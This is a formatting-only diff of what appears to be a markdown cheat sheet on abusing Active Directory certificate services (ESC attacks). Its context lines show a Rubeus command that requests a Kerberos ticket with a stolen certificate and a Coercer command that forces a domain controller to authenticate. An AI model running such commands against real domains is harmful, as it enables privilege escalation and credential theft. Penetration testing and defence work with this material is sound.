@@ -238,8 +238,6 @@ C:\Tools\Rubeus.exe asktgt /user:USER /certificate:C:\Certs\USER.pfx /password:P
 
 <br>
 
-----------------------------------
-
 <br>
 
 # <a name="2"></a>ESCx Abuses
@@ -458,8 +456,6 @@ source coercer_venv/bin/activate
 /opt/Tools/Coercer/Coercer.py coerce -l MACHINE_NAME.DOMAIN -t DC.DOMAIN -u USER -p 'PASSWORD' -d DOMAIN -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
 ```
 
-
-
 <br>
 
 ### <a name="27">2.7 &nbsp;&nbsp; ESC11
@@ -490,9 +486,6 @@ source coercer_venv/bin/activate
 ```
 
 <br>
-
-----------------------------------
-
 <br>
 
 # <a name="3">3. &nbsp;&nbsp; Sources
